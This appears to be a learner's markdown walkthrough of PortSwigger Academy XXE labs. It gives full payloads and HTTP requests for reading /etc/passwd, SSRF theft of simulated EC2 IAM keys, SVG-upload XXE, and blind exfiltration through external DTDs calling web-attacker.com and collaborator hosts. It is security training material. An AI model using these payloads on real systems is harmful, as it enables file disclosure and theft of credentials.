<span style="color:yellow;font-weight:700;font-size:30px">
XML external entity (XXE) injection - 4 Labs
</span>

# ***[XXE explained:](https://portswigger.net/web-security/xxe)***

examples:
```xml
&payload; = <!doctype foo [ <!entity "payload" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

# ***[1. Lab: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)***

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

**request**:
```xml
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&aparecium;
</productId><storeId>2</storeId></stockCheck>
```

response:
```
HTTP/1.1 400 Bad Request

"Invalid product ID: 
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    ..
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
..
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```
# Lab solved


# ***[2. Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)***

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

**what we know:**
EC2 metadata endpoint -  http://169.254.169.254/

1. **request1**: test vilnerability
```xml
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&aparecium;
</productId><storeId>2</storeId></stockCheck>
```

response:
```
HTTP/1.1 400 Bad Request

"Invalid product ID: 
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin    ..
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
..
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

3. get data from another server:
request for the files in the ip address:
```xml
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/"> ]>
```
response: 
"Invalid product ID: latest"

request for "latest" folder:
```xml
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/"> ]>
```
response: 
"Invalid product ID: meta-data"

request for "meta-data" folder:
```xml
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
```
response: 
"Invalid product ID: iam"

request for "iam" folder:
```xml
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
```
response: 
"Invalid product ID: security-credentials"

request for "security-credentials" folder:
```xml
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/security-credentials"> ]>
```
response:
```
"Invalid product ID: admin"
```

request for "admin" folder:
```xml
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/security-credentials/admin"> ]>
```
response: 
```
HTTP/1.1 400 Bad Request

"Invalid product ID: 
{
"Code" : "Success",
"LastUpdated" : "2022-06-14T19:32:05.404485039Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "DyhKrjoWZ3sc7baHwQOz",
"SecretAccessKey" : "wybIAzOjsBIjJfZobUvkIe3stXf96BH9IZnMEMKH",
"Token" : "y03qB1O1t6Ecx67K3Rtf41tbLLn3jVU4T82HCHLUUNueNHNRw4jbLTV7qoVOFDSa2Dg5oy0q04etSvN5eEFbSZPpgjCpYKMqugmv0n8cu5JVm0CdBD0sFwihUG0AharGqkz6KxZSkwAMlkGVHkjYUEsrGUkLgksBLqVcK0UmAtUgbXMmj5rWYenmFLJy8pb3En1fHmOyZXJanvzvfiIwZTzm3dqlb3CdfZrK4Ox2KliLpSMsr5iOSvgOQA2erVK7",
"Expiration" : "2028-06-12T19:32:05.404485039Z"
}
"
```
# Lab solved

# ***[3. Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)***

 This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 

**hint**: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. 

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

<!-- examples: https://en.wikipedia.org/wiki/XInclude 
include exlanation: https://www.w3schools.com/xml/el_include.asp -->

# Lab solved!


# ***[4. Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)***

 This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

**hint**: The SVG image format uses XML. 

1. load avatar and send request to repeater:"
**request**:
```
POST /post/comment HTTP/1.1
Content-Type: multipart/form-data; 
boundary=---------------------------346346600632902503642525096863


-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="csrf"

dsoHHprllZwQdUYsVfNttIiI0BAcKeNY
-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="postId"

5
-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="comment"

test
-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="name"

peter
-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="avatar"; filename="SVG_Logo.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 300 300">

  <title>SVG Logo</title>
  <desc>Designed for the SVG Logo Contest in 2006 by Harvey Rayner, and adopted by W3C in 2009. It is available under the Creative Commons license for those who have an SVG product or who are using SVG on their site.</desc>
..
.. 
       </cc:License>
     </rdf:RDF>
   </metadata>
   

   <defs>
     <g id="SVG" fill="#ffffff" transform="scale(2) translate(20,79)">
        <path id="S" d="M 5.482,31.319 C2.163,28.001 0.109,23.419 0.109,18.358 C0.109,8.792,25.952 L91.792,25.952 Z"/>
      </g>
   </defs>

   <path id="base" fill="#000" d="M8.5,150 H291.5 V250 C291.5,273.5 273.5,291.5 250,291.5 

</svg>
-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="email"

clean@token.com
-----------------------------346346600632902503642525096863
Content-Disposition: form-data; name="website"


-----------------------------346346600632902503642525096863--
```

2. change the whole SVG file data with an XXE attack:
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
**final request**:
```
POST /post/comment HTTP/1.1


-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="csrf"

dsoHHprllZwQdUYsVfNttIiI0BAcKeNY
-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="postId"

4
-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="comment"

attack
-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="name"

attcaker
-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="avatar"; filename="SVG_Logo.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="email"

clean@token.com
-----------------------------236802198913264706471563530208
Content-Disposition: form-data; name="website"


-----------------------------236802198913264706471563530208--
```
81ece57f5921
check **GET /post?postId=4 HTTP/1.1** and see that the avatar has changed and now contains a string. copy the string to the solution field

# Lab Solved

<span style="color:yellow;font-weight:700;font-size:30px">
Finding and exploiting blind XXE vulnerabilities
</span>
https://portswigger.net/web-security/xxe/blind

materials:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com" ]
```

# ***[1. Lab: Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)***

 This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 


craft payload:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://cfvkyb57baq4ci1m5es05o37byho5d.oastify.com"> ]>

```
**request**:

    POST /product/stock HTTP/1.1

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE dc [ <!ENTITY shazam SYSTEM "http://cfvkyb57baq4ci1m5es05o37byho5d.oastify.com"> ]>
    <stockCheck><productId>&shazam;</productId>

# Lab solved

materials:
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>


# ***[2. Lab: Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)***


 This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

colaborator:
    2loa41bxh0wui87cb4yqbe9xhonfb4.oastify.com

payload:
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://2loa41bxh0wui87cb4yqbe9xhonfb4.oastify.com"> %xxe; ]>

**request**:
    POST /product/stock HTTP/1.1

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://2loa41bxh0wui87cb4yqbe9xhonfb4.oastify.com"> %xxe; ]>
    <stockCheck><productId>4</productId>

# Lab solved

# ***[3. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)***

 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file. 

materials:
**exfiltrate payload:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**to be hosted in exploit server address:**
    http://web-attacker.com/malicious.dtd

**payload submission to victim:**
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

colaborateor:
    g0hojfqbweb8xmmqqid4qsobw22uqj.oastify.com


1.  craft a payload to exfiltrate content (stage2) - to be hosted on exploit server.
*(after failing with exfiltrating /etc/passwd (beacause of new line characters not being parsed by XML - replace target to /etc/hostname)* 

```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://1su9b0iwoz3tp7ebi35pidgwonuhi6.oastify.com/?x=%file;'>">
    %eval;
    %exfiltrate;
```

2. the payload address:
```
https://exploit-0a800077030e429cc0801b93010e00aa.exploit-server.net/exploit.dtd
```

3. craft payload for entry-site (stage1)
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a800077030e429cc0801b93010e00aa.exploit-server.net/exploit.dtd"> %xxe;]>
```
4. send to vulnerable site:
**request**:
```xml
POST /product/stock HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a800077030e429cc0801b93010e00aa.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

5. observe in colaborator:
```
GET /?x=7369a26b5cf0 HTTP/1.1
```
6. enter the value of x as solution

# Lab Solved


# ***[5. Lab: Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. 

1. craft stage2 in exploit server:
```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
exploit address:
```
https://exploit-0ad500af0411182dc0d25d9d0116009f.exploit-server.net/exploit.dtd
```
2. craft payload for entry-site (stage1)
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad500af0411182dc0d25d9d0116009f.exploit-server.net/exploit.dtd"> %xxe;]>

send stage 1:
**request**:
    POST /product/stock HTTP/1.1

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ad500af0411182dc0d25d9d0116009f.exploit-server.net/exploit.dtd"> %xxe;]>

response:
    HTTP/1.1 400 Bad Request

    "XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    ...

# Lab Solved


materials:

 For example, suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called custom_entity. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following: 

    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>

 For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:
    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    %local_dtd;
    ]>



# ***[6. Lab: Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)***

 Solved

This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
You'll need to reference an existing DTD file on the server and redefine an entity from it. 

**Hint**: Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.

1. check for existing DTD:
```
    POST /product/stock HTTP/1.1

    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">%local_dtd;]><stockCheck>
```
response:
```
    HTTP/1.1 200 OK

```

we know this dtd exist (if not present parser will return error: 
>*"XML parser exited with error: java.io.FileNotFoundException: /usr/share/yelp/dtd/notreal.dtd (No such file or directory)"*)

2. check for the dtd [online](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd)and observe a list of potential enteties to repurpose:
```xml
%ISOamsa;
%ISOamsb;
%ISOamsc;
%ISOamsn;
%ISOamso;
%ISOamsr;
%ISObox;
%ISOcyr1;
%ISOcyr2;
%ISOdia;
%ISOgrk1;
%ISOgrk2;
%ISOgrk3;
%ISOgrk4;
%ISOlat1;
%ISOlat2;
%ISOnum;
%ISOpub;
%ISOtech;
```
3. carft payload. replace **custom_entity** with above enteties names
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOtech '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
response:
```
HTTP/1.1 400 Bad Request

"XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```
# Lab Solved!



<!-- assitance materials:
  xxe  explanation:https://portswigger.net/web-security/xxe
  ssrf explanation:https://portswigger.net/web-security/ssrf
  ec2 explanation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
  IAM role explanation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html -->